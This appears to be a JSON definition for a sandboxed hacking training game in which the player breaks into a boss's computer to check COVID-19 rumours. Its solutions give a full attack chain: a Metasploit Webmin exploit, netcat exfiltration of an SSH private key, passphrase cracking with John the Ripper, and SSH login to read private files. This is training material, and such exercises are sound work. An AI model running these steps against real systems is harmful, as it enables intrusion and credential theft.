@@ -1,0 +1,189 @@
+{
+  "title" : "[Delta] COVID-19 Truth seeker",
+  "description" : "Your company has been recently involved in few COVID-19 conspiracies. Your colleagues don't really seem to care, but it has caught your attention and you are struggling to work without being sure that they are just made-up nonsense.  Can you find out the truth?",
+  "prerequisities" : [ "Basic shell commands and constructs", "Basics of computer networking", "Using SSH with public key authentication", "Basics of file system permissions on Unix-like systems" ],
+  "outcomes" : [ "Level 2: Scanning hosts for vulnerabilities using Nmap, basics of CVE system", "Level 3: Using Metasploit to exploit discovered vulnerabilities of host", "Level 4: Downloading files from remote host using Netcat shell or by upgrading Metasploit session with Meterpreter", "Level 5: Cracking encrypted SSH keys using 'John the Ripper'", "Level 6: Basic shell scripting, intermediately complex shell commands" ],
+  "state" : "UNRELEASED",
+  "show_stepper_bar" : true,
+  "levels" : [ {
+    "type" : "InfoLevelImportDTO",
+    "title" : "Introduction",
+    "max_score" : 0,
+    "level_type" : "INFO_LEVEL",
+    "order" : 0,
+    "estimated_duration" : 0,
+    "content" : "You work for pharmaceutic company that specializes in development of vaccines. Last months have been difficult time for everyone because of the COVID-19 pandemic. To make matters worse, there has been a rumour circling around that COVID-19 is artificially created and your company took a part in the process (started by enemies of the company, according to the leaders of the company). \n\nRight now, you don't know why but this rumour caught your attention. You are struggling to continue working if you are not 100% sure that these rumours are just hoaxes. Only one source is the most reliable one - your boss. However, he won't tell you anything that secret as you are just a regular worker. Answers might be hidden on his computer. You have no chance to be in physical contact with your boss' computer, so you are trying to think what would be the best other option.\n\nIt's lunch time. You have been thinking for almost an hour without success when suddenly IT crew is walking past you on their way to canteen and you hear their dialogue:\n* John : \"*... you know that software on server wasn't updated a long time so please, do it as soon as possible...*\"\n* Bob : \"*... oh yes I forgot again, I promise I will take care of it after the lunch...*\"\n\nYou realize that this is probably your best chance to get into boss' computer and it is through the company's server. So you skip the lunch, take your laptop to the most safe place in company - toilets, lock yourself and hope you can find the truth you seek for."
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Finding the path",
+    "max_score" : 100,
+    "level_type" : "GAME_LEVEL",
+    "order" : 1,
+    "estimated_duration" : 6,
+    "flag" : "CVE-2019-15107",
+    "content" : "As you have heard, there might be some outdated software installed on the company's server. You should try to scan it and see if you cand find some vulnerabilities. Fortunately, you work in this company long enough to remember server's ip address - **10.1.26.9** which will definitely help you. Scan the server for vulnerable software. Flag is **CVE number** of the vulnerability of that software discovered in **2019** with the **highest CVSS Score** in this format: CVE-XXXX-XXXXX.\n\nYour computer credentials are:\n* login: **root**\n* password: **toor**\n\n",
+    "solution" : "* Get list of server vulnerabilities: `nmap 10.1.26.9 --script=vuln` and analyze it.\n* Search \"webmin\" vulnerabilities on www.cvedetails.com and choose the one with highest (10.0) CVSS Score.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Which arguments should I use?",
+      "content" : "You look closer and find out there is more of it: \"**script equals vuln**\". See nmap --help for more info.",
+      "hint_penalty" : 20,
+      "order" : 1
+    }, {
+      "title" : "Where to find the CVE number?",
+      "content" : "Use www.cvedetails.com to find the right vulnerability.",
+      "hint_penalty" : 20,
+      "order" : 2
+    }, {
+      "title" : "What tool can I use?",
+      "content" : "You look to your left and you find word \"**nmap**\" wrote on tile near the toilet paper. What can it be?",
+      "hint_penalty" : 20,
+      "order" : 0
+    } ],
+    "incorrect_flag_limit" : 100,
+    "MITRE_techniques" : {
+      "TA0043.T1595.002" : "Reconnaissance.Active Scanning.Vulnerability Scanning",
+      "TA0043.T1592.002" : "Reconnaissance.Gather Victim Host Information.Software",
+      "TA0042.T1588.006" : "Resource Development.Obtain Capabilities.Vulnerabilities"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Exploiting the vulnerability",
+    "max_score" : 100,
+    "level_type" : "GAME_LEVEL",
+    "order" : 2,
+    "estimated_duration" : 10,
+    "flag" : "always-verify-the-source",
+    "content" : "You scanned the server and found out that it has **Webmin** vulnerability **CVE-2019-15107**. Now you need to exploit it and access the server. Flag is located as string in file **hoax.txt**.",
+    "solution" : "* Exploit the server vurnerability with this commands:    \n`msfconsole`  \n`use exploit/unix/webapp/webmin_backdoor`  \n`set RHOSTS 10.1.26.9`  \n`set LHOST 10.1.135.83`  \n`set SSL true`  \n`exploit`  \n`cat hoax.txt`\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Which module should I use?",
+      "content" : "You google more and find out that module **webmin_backdoor** should help you.",
+      "hint_penalty" : 20,
+      "order" : 1
+    }, {
+      "title" : "Which options should I set?",
+      "content" : "There is LHOST - that's you (but don't use 'localhost'!). RHOST - that's server. Do not forget to allow negotiate SSL/TLS for outgoing connections. See **show options** for more help.",
+      "hint_penalty" : 20,
+      "order" : 2
+    }, {
+      "title" : "What tool can I use?",
+      "content" : "You google \"vulnerability exploitation tool\" and find out that **Metasploit** exists.",
+      "hint_penalty" : 20,
+      "order" : 0
+    } ],
+    "incorrect_flag_limit" : 100,
+    "MITRE_techniques" : {
+      "TA0001.T1190" : "Initial Access.Exploit Public-Facing Application",
+      "TA0002.T1059.004" : "Execution.Command and Scripting Interpreter.Unix Shell"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Stealing the key",
+    "max_score" : 100,
+    "level_type" : "GAME_LEVEL",
+    "order" : 3,
+    "estimated_duration" : 12,
+    "flag" : "2798",
+    "content" : "You have gained access to the server! Let's find a way to get to computer of your boss. The easiest way could be trying to obtain **SSH key** of your boss' computer stored on this server. So let's find it and copy it to your machine. Flag is the **last four digits of the CRC checksum** of the file.\n\nNote: It might be a good idea to **upgrade** your metasploit session to take full advantage of gained access.\n",
+    "solution" : "* Upgrade your session (optional):      \n`background (or you can press CTRL+Z instead)`    \n`use post/multi/manage/shell_to_meterpreter`    \n`set SESSION 1 (substitute 1 with the correct number of the session created in the previous level if it is not 1)`     \n`exploit`   \n`sessions –i 2 (substitute 2 with number from the output of the previous command if you have created other sessions)`     \n\n* Key is located in: /home/server/.ssh/id_rsa (you can use 'cd' command in upgraded session, but not in the original session).\n\n* If you have upgraded your session, you can simply use 'download' command to download key file:    \n`download /home/server/.ssh/id_rsa (downloaded file should be located in your home directory)`\n\n* Otherwise, you can use 'nc' command:    \n`on your computer: nc -l -p 9999 > id_rsa`   \n`on server: nc 10.1.135.83 9999 < /home/server/.ssh/id_rsa`\n\n* Use command 'cksum id_rsa' to calculate checksum of file (checksum is the first number in the output of the command). \n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "How to use command from previous hint to download the key?",
+      "content" : "On your computer, **listen** with netcat on **chosen port** (e. g. 9999) and **redirect received data to a file**. **On server**, send this file using netcat with **specified port, IP adress** of your computer and **key file as input** of command (**use redirection**).\n",
+      "hint_penalty" : 20,
+      "order" : 3
+    }, {
+      "title" : "How to calculate checksum of the file?",
+      "content" : "Use command **'cksum'** to calculate checksum of a file.\nNOTE: Copying the key by printing contents of the key, selecting printed text and copying it to your computer might result in file with different checksum!",
+      "hint_penalty" : 10,
+      "order" : 4
+    }, {
+      "title" : "OPTIONAL - How to upgrade the session?",
+      "content" : "Upgrade your session with **'Shell to Meterpreter Upgrade'** module.",
+      "hint_penalty" : 10,
+      "order" : 0
+    }, {
+      "title" : "Where is the key located?",
+      "content" : "Key is located where you would expect it to be (**default location and filename**) for **username server**.",
+      "hint_penalty" : 10,
+      "order" : 1
+    }, {
+      "title" : "Which command can I use to download the key?",
+      "content" : "If you are using Meterpreter, it offers a simple command to **download** files. Otherwise, use **'nc'** (netcat) command(s) to download file from server to your computer.\n",
+      "hint_penalty" : 20,
+      "order" : 2
+    } ],
+    "incorrect_flag_limit" : 100,
+    "MITRE_techniques" : {
+      "TA0006.T1552.004" : "Credential Access.Unsecured Credentials.Private Keys",
+      "TA0010.T1041" : "Exfiltration.Exfiltration Over C2 Channel"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Small inconvenience",
+    "max_score" : 100,
+    "level_type" : "GAME_LEVEL",
+    "order" : 4,
+    "estimated_duration" : 9,
+    "flag" : "bobrules",
+    "content" : "You are almost there! However, it turns out that key you have found is encrypted, so you will first need to **crack** it before you can access computer of your boss. Flag is the **cracked passphrase**.\n",
+    "solution" : "* Prepare the files for 'John the Ripper' and then use him to crack the key file:   \n`cp /usr/share/wordlists/rockyou.txt.gz .`        \n`gunzip rockyou.txt.gz`     \n`cp /usr/share/john/ssh2john.py .`  \n`python ssh2john.py id_rsa > hash`  \n`john hash -wordlist=rockyou.txt`   \n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Which auxiliary files should I use (and how)?",
+      "content" : "You want to use wordlist **'/usr/share/wordlists/rockyou.txt.gz'** that you first need to unpack with **'gunzip'** command and python script **'/usr/share/john/ssh2john.py'** to **convert file** to suitable format for John.\n",
+      "hint_penalty" : 30,
+      "order" : 2
+    }, {
+      "title" : "Where can I find auxiliary files for the cracker?",
+      "content" : "Suitable wordlists are contained in directory **/usr/share/wordlists** and you can find auxiliary tools for the cracker in the directory **/usr/share/john**.\n",
+      "hint_penalty" : 10,
+      "order" : 1
+    }, {
+      "title" : "Which tool can I use to crack the key?",
+      "content" : "There are multiple tools designed for this purpose, I would recommend one, which name starts with **\"John\"**.\n",
+      "hint_penalty" : 10,
+      "order" : 0
+    } ],
+    "incorrect_flag_limit" : 100,
+    "MITRE_techniques" : {
+      "TA0006.T1110.002" : "Credential Access.Brute Force.Password Cracking"
+    }
+  }, {
+    "type" : "GameLevelImportDTO",
+    "title" : "Finding out the truth",
+    "max_score" : 100,
+    "level_type" : "GAME_LEVEL",
+    "order" : 5,
+    "estimated_duration" : 8,
+    "flag" : "no-conspiracy",
+    "content" : "You finally have access to your boss' computer. Now you must log in to his computer and find the right file. You know that IP address of his computer is **10.1.17.4** and you should be able to guess his username from the password... **Sha512** hash's first 10 characters of the file you are looking for are **206ce87678**. Flag is a **string** at the end of the file you are looking for.\n\nNote: Your boss is an average computer user, who wouldn't really try to hide his files in obscure locations (like system files).",
+    "solution" : "* To fix access rights of the key and connect to boss' computer use commands:     \n`chmod 600 <rsa_key_file>`      \n`ssh -i <rsa_key_file> bob@10.1.17.4`   \n* Key is located in /home/private/Documents/docs/email/work directory:   \n`sha512sum /home/private/Documents/Docs/email/work/* | grep 206ce87678`   \n* The file you are loooking for has name CEOMNlPM:   \n`cat /home/private/Documents/Docs/email/work/CEOMNlPM`   \n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "How do I calculate sha512 hash of a file?",
+      "content" : "Use command **'sha512sum'** to calculate sha512 hash of files.",
+      "hint_penalty" : 10,
+      "order" : 1
+    }, {
+      "title" : "How do I make the key appear secure for ssh login?",
+      "content" : "If you can't get past authentication on ssh login because the key is regarded as insecure, use command **'chmod'** with suitable integer as argument to make the key \"secure\".\n",
+      "hint_penalty" : 20,
+      "order" : 0
+    }, {
+      "title" : "Where should I look for the file?",
+      "content" : "Hashing all files would take some time. Try looking for **\"private work emails\"**.",
+      "hint_penalty" : 25,
+      "order" : 2
+    } ],
+    "incorrect_flag_limit" : 100,
+    "MITRE_techniques" : {
+      "TA0008.T1021.004" : "Lateral Movement.Remote Services.SSH",
+      "TA0009.T1005" : "Collection.Data from Local System"
+    }
+  } ],
+  "estimated_duration" : 45,
+  "sandbox_definition_ref_id" : 38
+}
